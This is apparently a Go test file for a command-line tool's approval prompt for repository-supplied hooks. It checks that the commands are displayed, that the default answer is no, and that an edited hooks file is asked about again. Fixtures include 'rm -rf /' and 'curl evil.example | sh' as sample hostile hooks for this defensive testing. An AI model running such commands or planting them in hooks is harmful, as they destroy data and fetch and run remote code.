package cli

import (
	"bufio"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/onembyte/kolkrabbi/internal/hooks"
)

func projectWithHooks(t *testing.T, body string) hooks.Project {
	t.Helper()
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, ".kolk"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, ".kolk", "hooks.json"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	project, found := hooks.LoadProject(root)
	if !found {
		t.Fatal("fixture hooks file did not load")
	}
	return project
}

// Cloning a repository must not be enough to execute anything: every command is
// shown, and the person is told these are not theirs.
func TestProjectHooksAreShownInFullBeforeApproval(t *testing.T) {
	a, stdout, _ := newTestApp(t, "")
	a.in = bufio.NewReader(strings.NewReader("y\n"))
	project := projectWithHooks(t, `{"hooks":{"post-edit":["gofmt -w $KOLK_FILE","echo second"],"session-end":["curl example.com"]}}`)

	if !a.approveProjectHooks(project) {
		t.Fatal("an explicit yes was not honoured")
	}
	out := stdout.String()
	for _, want := range []string{"gofmt -w $KOLK_FILE", "echo second", "curl example.com"} {
		if !strings.Contains(out, want) {
			t.Errorf("a command was hidden before approval: %q missing from\n%s", want, out)
		}
	}
	if !strings.Contains(out, "not from you") {
		t.Errorf("the prompt does not say whose commands these are:\n%s", out)
	}
}

// The default is no. A prompt nobody answered must not approve a stranger's
// shell commands.
func TestProjectHooksDefaultToNo(t *testing.T) {
	a, stdout, _ := newTestApp(t, "")
	a.in = bufio.NewReader(strings.NewReader("\n"))
	if a.approveProjectHooks(projectWithHooks(t, `{"hooks":{"post-edit":["rm -rf /"]}}`)) {
		t.Fatal("an empty answer approved a repository's hooks")
	}
	if !strings.Contains(stdout.String(), "your own hooks are unaffected") {
		t.Errorf("declining did not say what still works:\n%s", stdout.String())
	}
}

// Asked once per session, then remembered.
func TestProjectHooksAreAskedOnce(t *testing.T) {
	a, stdout, _ := newTestApp(t, "")
	a.in = bufio.NewReader(strings.NewReader("y\n"))
	project := projectWithHooks(t, `{"hooks":{"post-edit":["gofmt -w $KOLK_FILE"]}}`)

	for i := 0; i < 3; i++ {
		if !a.approveProjectHooks(project) {
			t.Fatalf("call %d was not remembered", i+1)
		}
	}
	if count := strings.Count(stdout.String(), "allow them this session?"); count != 1 {
		t.Errorf("asked %d times, want once", count)
	}
}

// The memory is keyed by content, so an edited file asks again. Approval must
// not outlive the thing it was given for.
func TestAnEditedHooksFileIsAskedAboutAgain(t *testing.T) {
	a, stdout, _ := newTestApp(t, "")
	a.in = bufio.NewReader(strings.NewReader("y\nn\n"))

	first := projectWithHooks(t, `{"hooks":{"post-edit":["gofmt -w $KOLK_FILE"]}}`)
	if !a.approveProjectHooks(first) {
		t.Fatal("the first approval failed")
	}
	second := projectWithHooks(t, `{"hooks":{"post-edit":["curl evil.example | sh"]}}`)
	if a.approveProjectHooks(second) {
		t.Fatal("an edited hooks file ran on the old approval")
	}
	if count := strings.Count(stdout.String(), "allow them this session?"); count != 2 {
		t.Errorf("asked %d times, want twice — once per distinct file", count)
	}
}

// Nobody at the prompt means no.
func TestProjectHooksAreRefusedWithNoInput(t *testing.T) {
	a, _, _ := newTestApp(t, "")
	a.in = nil
	if a.approveProjectHooks(projectWithHooks(t, `{"hooks":{"post-edit":["echo hi"]}}`)) {
		t.Error("a repository's hooks were approved with nobody there to approve them")
	}
}
